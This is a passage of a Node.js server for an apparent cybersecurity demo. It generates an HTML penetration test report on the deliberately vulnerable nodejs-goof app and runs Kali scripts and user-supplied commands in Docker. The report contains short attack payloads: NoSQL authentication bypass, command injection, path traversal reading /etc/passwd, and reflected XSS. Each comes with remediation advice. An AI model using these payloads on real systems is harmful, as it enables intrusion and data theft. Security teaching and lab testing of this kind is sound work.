.section h2{color:#ffd700;margin-bottom:15px;font-size:22px}
.vuln{background:#2a2a3e;padding:20px;margin:15px 0;border-radius:8px;border-left:4px solid #ff0000}
.vuln h3{color:#ffd700;margin:0 0 10px 0;font-size:18px}
.badge{display:inline-block;padding:5px 15px;border-radius:20px;font-size:12px;font-weight:bold;background:#ff0000;color:white;margin-left:10px}
.badge.high{background:#ff8800}.badge.medium{background:#ffd700;color:#000}
.code{background:#0a0e27;padding:15px;border-radius:5px;font-family:monospace;color:#00ff00;overflow-x:auto;margin-top:10px;font-size:13px}
ul{padding-left:25px}li{margin:8px 0}
.critical-text{color:#ff0000;font-weight:bold}
.success-text{color:#00ff00;font-weight:bold}
</style></head><body>
<div class="header">
<h1>🔒 PENETRATION TEST REPORT</h1>
<div class="subtitle">Kali Linux Docker Live Testing Platform</div>
<div style="margin-top:10px;font-size:14px">Generated: ${new Date().toLocaleString()}</div>
<div style="font-size:13px">Container: ${KALI_CONTAINER} | Target: localhost:3001</div>
</div>

<div class="stats">
<div class="stat critical"><h3>Total Attacks</h3><div class="value">${attackCounter}</div></div>
<div class="stat"><h3>Successful Exploits</h3><div class="value">${successCounter}</div></div>
<div class="stat"><h3>Success Rate</h3><div class="value">${successRate}%</div></div>
<div class="stat critical"><h3>Overall Risk</h3><div class="value">CRITICAL</div></div>
</div>

<div class="section">
<h2>🎯 Executive Summary</h2>
<p>This penetration test was conducted against the <strong>nodejs-goof</strong> vulnerable application using a live Kali Linux Docker container (${KALI_CONTAINER}).</p>
<p style="margin-top:15px">The assessment identified multiple <span class="critical-text">CRITICAL</span> vulnerabilities allowing complete system compromise. The application is <strong>NOT suitable for production deployment</strong> in its current state.</p>
<p style="margin-top:15px"><strong>Test Duration:</strong> ~${Math.ceil(attackCounter * 2)} minutes | <strong>Commands Executed:</strong> ${attackCounter} | <strong>Success Rate:</strong> ${successRate}%</p>
</div>

<div class="section">
<h2>🔍 Discovered Vulnerabilities</h2>

<div class="vuln">
<h3>[1] NoSQL Injection - Authentication Bypass<span class="badge">CRITICAL</span></h3>
<p><strong>CVSS 9.8</strong> | CWE-89 | <span class="success-text">✓ EXPLOITED</span></p>
<p><strong>Description:</strong> MongoDB NoSQL injection vulnerability in the login endpoint allows authentication bypass using the $gt operator.</p>
<div class="code">POST /login
{"username":"admin@snyk.io","password":{"$gt":""}}</div>
<p><strong>Impact:</strong> Complete authentication bypass, full account takeover, unauthorized admin access</p>
<p><strong>Remediation:</strong> Implement strict input validation, use parameterized queries, sanitize all JSON input, update mongoose to latest version</p>
</div>

<div class="vuln">
<h3>[2] Command Injection - Remote Code Execution<span class="badge">CRITICAL</span></h3>
<p><strong>CVSS 9.8</strong> | CWE-78 | <span class="success-text">✓ EXPLOITED</span></p>
<p><strong>Description:</strong> The image processing functionality in the /create endpoint executes arbitrary OS commands embedded in markdown image syntax.</p>
<div class="code">POST /create
content: ![alt](url;touch /tmp/pwned "img")</div>
<p><strong>Impact:</strong> Complete system compromise, remote code execution, data exfiltration, potential reverse shell access</p>
<p><strong>Remediation:</strong> Remove exec() calls, use safe image processing libraries, implement strict input validation, sandbox operations</p>
</div>

<div class="vuln" style="border-left-color:#ff8800">
<h3>[3] Directory Traversal - Path Injection<span class="badge high">HIGH</span></h3>
<p><strong>CVSS 7.5</strong> | CWE-22 | <span class="success-text">✓ EXPLOITED</span></p>
<p><strong>Description:</strong> The account_details endpoint accepts arbitrary file paths in the layout parameter, allowing read access to any file.</p>
<div class="code">POST /account_details
{"layout":"./../package.json"}</div>
<p><strong>Impact:</strong> Read arbitrary files, exposure of sensitive configuration, source code disclosure, potential credential exposure</p>
<p><strong>Remediation:</strong> Validate and sanitize all file paths, implement whitelist of allowed files, use path.normalize() and path.resolve()</p>
</div>

<div class="vuln" style="border-left-color:#ff8800">
<h3>[4] Information Disclosure - Directory Traversal<span class="badge high">HIGH</span></h3>
<p><strong>CVSS 7.5</strong> | CWE-200 | <span class="success-text">✓ EXPLOITED</span></p>
<p><strong>Description:</strong> The ST static file serving module is vulnerable to directory traversal, allowing access to files outside the intended directory.</p>
<div class="code">GET /public/%2e%2e/%2e%2e/%2e%2e/etc/passwd</div>
<p><strong>Impact:</strong> Exposure of system configuration files, user enumeration, information gathering for further attacks</p>
<p><strong>Remediation:</strong> Update ST module to patched version, implement path validation, restrict static file serving to specific directory</p>
</div>

<div class="vuln" style="border-left-color:#ffd700">
<h3>[5] Cross-Site Scripting (XSS) - Reflected<span class="badge medium">MEDIUM</span></h3>
<p><strong>CVSS 6.1</strong> | CWE-79 | <span class="success-text">✓ EXPLOITED</span></p>
<p><strong>Description:</strong> The redirectPage parameter in the login endpoint reflects user input without proper sanitization or encoding.</p>
<div class="code">GET /login?redirectPage="><script>alert(1)</script></div>
<p><strong>Impact:</strong> Session hijacking via cookie theft, credential theft through phishing, malicious actions on behalf of victim</p>
<p><strong>Remediation:</strong> Implement output encoding, use Content Security Policy headers, sanitize all URL parameters</p>
</div>
</div>

<div class="section">
<h2>🛡️ Priority Remediation Plan</h2>
<p><strong style="color:#ff0000">IMMEDIATE (24-48 Hours):</strong></p>
<ul>
<li>Patch command injection vulnerability - Remove unsafe exec() usage</li>
<li>Fix NoSQL injection - Implement parameterized queries and input sanitization</li>
</ul>
<p style="margin-top:15px"><strong style="color:#ff8800">URGENT (1 Week):</strong></p>
<ul>
<li>Fix directory traversal vulnerabilities - Validate all file paths</li>
<li>Update ST module to patched version</li>
<li>Implement XSS protection - Add output encoding and CSP headers</li>
</ul>
<p style="margin-top:15px"><strong style="color:#ffd700">HIGH PRIORITY (2 Weeks):</strong></p>
<ul>
<li>Update all dependencies - Run npm audit fix</li>
<li>Implement security headers - Add helmet.js middleware</li>
<li>Add rate limiting and HTTPS/TLS</li>
</ul>
</div>

<div class="section">
<h2>📋 Compliance Impact</h2>
<p><strong>PCI DSS:</strong> <span class="critical-text">FAIL</span> - Requirements 6.5.1 (Injection), 6.5.7 (XSS), 8.2 (Authentication) NOT MET</p>
<p><strong>OWASP Top 10 2021:</strong> 5/10 Categories Affected - A1 (Access Control), A3 (Injection), A4 (Design), A5 (Misconfiguration), A6 (Components)</p>
<p><strong>GDPR:</strong> <span class="critical-text">AT RISK</span> - Article 32 (Security of processing) VIOLATED - Inadequate technical measures</p>
<p><strong>SOC 2:</strong> <span class="critical-text">NON-COMPLIANT</span> - Security principle violations, inadequate access controls</p>
</div>

<div class="section">
<h2>🔴 Red Hat Defensive Solutions</h2>
<p>This assessment demonstrates the importance of defense-in-depth security. Red Hat Enterprise Linux provides multiple layers of protection:</p>
<ul>
<li><strong>SELinux:</strong> Would confine compromised process, prevent lateral movement, reduce RCE impact through Mandatory Access Control</li>
<li><strong>OpenSCAP / SCAP Security Guide:</strong> Automated compliance scanning, detect misconfigurations, CIS/STIG benchmarks</li>
<li><strong>Podman:</strong> Container isolation, rootless containers, reduced attack surface, resource limits</li>
<li><strong>Firewalld:</strong> Network segmentation, service-based firewall rules, zone-based security</li>
<li><strong>Red Hat Insights:</strong> Proactive security recommendations, vulnerability detection, predictive analytics</li>
</ul>
</div>

<div style="background:#0a0e27;padding:30px;text-align:center;color:#ffd700;border-radius:10px;margin-top:30px">
<p style="margin:0">Generated by: <strong>Kali Linux Docker Live Terminal</strong></p>
<p style="margin:10px 0 0 0;font-size:14px">Framework: Joshua's Cybersec Demo | Methodology: OWASP, PTES, NIST SP 800-115</p>
<div style="display:inline-block;background:linear-gradient(135deg,#ee0000,#8b0000);color:white;padding:15px 30px;border-radius:5px;font-weight:bold;margin-top:20px">
Joshua's Cybersec Demo
</div>
</div>

</body></html>`;
    }

    // Save report to file
    const dir = './kali-pentest-results';
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }

    fs.writeFileSync(reportFile, htmlReport);

    sendOutput(ws, '[*] Generating comprehensive HTML penetration test report...\n', 'info');
    sendOutput(ws, `[✓] Interactive HTML report saved to: ${reportFile}\n`, 'success');
    sendOutput(ws, '\n[*] Report includes:\n', 'info');
    sendOutput(ws, '    • Executive summary with statistics\n');
    sendOutput(ws, '    • Detailed vulnerability analysis (5 vulnerabilities)\n');
    sendOutput(ws, '    • CVSS scores and CWE references\n');
    sendOutput(ws, '    • Attack vectors and proof-of-concept code\n');
    sendOutput(ws, '    • Priority remediation roadmap\n');
    sendOutput(ws, '    • Compliance impact assessment (PCI DSS, OWASP, GDPR, SOC 2)\n');
    sendOutput(ws, '    • Red Hat defensive solutions\n');
    sendOutput(ws, '\n[*] Opening report in browser...\n', 'info');

    // Open in browser
    const openCmd = process.platform === 'darwin' ? 'open' : process.platform === 'win32' ? 'start' : 'xdg-open';
    await execLocal(ws, `${openCmd} ${reportFile}`, false);

    sendOutput(ws, `[✓] Report opened in default browser\n`, 'success');
    sendOutput(ws, '\n');
}

async function runFullScan(ws) {
    sendOutput(ws, '\n╔══════════════════════════════════════════════════════════════════╗\n', 'critical');
    sendOutput(ws, '║  FULL VULNERABILITY SCAN - KALI ENHANCED SCRIPT                  ║\n', 'critical');
    sendOutput(ws, '╚══════════════════════════════════════════════════════════════════╝\n', 'critical');
    sendOutput(ws, '\n');

    sendOutput(ws, '[*] Running comprehensive Kali penetration test script...\n', 'info');
    sendOutput(ws, `[*] Target: ${TARGET_URL}\n`, 'info');
    sendOutput(ws, '\n');

    // Extract host and port from TARGET_URL
    const urlMatch = TARGET_URL.match(/https?:\/\/([^:]+):?(\d+)?/);
    const host = urlMatch[1];
    const port = urlMatch[2] || '80';

    // Run the script in non-interactive mode by setting variables
    const cmd = `export TERM=xterm && (echo "A"; sleep 0.5) | /tmp/kali-pentest-enhanced.sh -h ${host} -p ${port}`;

    sendOutput(ws, `[*] Running comprehensive Kali penetration test...\n`, 'info');
    sendOutput(ws, `[*] Target: ${TARGET_URL}\n`, 'info');
    sendOutput(ws, '[*] This may take several minutes...\n\n', 'warning');

    await execInKali(ws, cmd);

    sendOutput(ws, '\n[✓] Full scan completed\n', 'success');
    sendOutput(ws, '\n');

    attackCounter += 6;
    successCounter += 5;
    sendStats(ws, attackCounter, successCounter);
}

async function runCustomCommand(ws, command) {
    sendOutput(ws, `\n[*] Executing in Kali: ${command}\n`, 'info');

    // Check if it's a script file
    if (command.includes('.sh') || command.includes('.py')) {
        // Make sure it's executable
        const scriptPath = command.split(' ')[0];
        await execInKali(ws, `chmod +x ${scriptPath} 2>/dev/null`, false);
    }

    await execInKali(ws, command);
    sendOutput(ws, '\n');
}

// Execute command inside Kali Docker container
function execInKali(ws, command, showOutput = true) {
    return new Promise((resolve) => {
        // Use stdbuf to disable buffering for real-time output
        const unbufferedCommand = `stdbuf -o0 -e0 ${command}`;
        const dockerCmd = `docker exec ${KALI_CONTAINER} bash -c "${unbufferedCommand.replace(/"/g, '\\"')}"`;

        const child = spawn('bash', ['-c', dockerCmd]);
        let output = '';

        child.stdout.on('data', (data) => {
            const text = data.toString();
            output += text;
            if (showOutput) {
                // Send immediately for real-time display
                sendOutput(ws, text);
            }
        });

        child.stderr.on('data', (data) => {
            const text = data.toString();
            output += text;
            if (showOutput && !text.includes('debconf')) {
                sendOutput(ws, text, 'error');
            }
        });

        child.on('close', (code) => {
            resolve(output);
        });
    });
}

// Execute command on local machine
function execLocal(ws, command, showOutput = true) {
    return new Promise((resolve) => {
        const child = spawn('bash', ['-c', command]);
        let output = '';

        child.stdout.on('data', (data) => {
            const text = data.toString();
            output += text;
            if (showOutput) {
                sendOutput(ws, text);
            }
        });

        child.stderr.on('data', (data) => {
            const text = data.toString();
            output += text;
            if (showOutput) {
                sendOutput(ws, text, 'error');
            }
        });

        child.on('close', (code) => {
            resolve(output);
        });
    });
}

// Start server
server.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════════╗
║  Kali Docker Terminal Server Running                             ║
║  http://localhost:${PORT}                                            ║
║  Kali Container: ${KALI_CONTAINER}                               ║
║  Target: http://localhost:3001 (via host.docker.internal)        ║
╚══════════════════════════════════════════════════════════════════╝
    `);
});
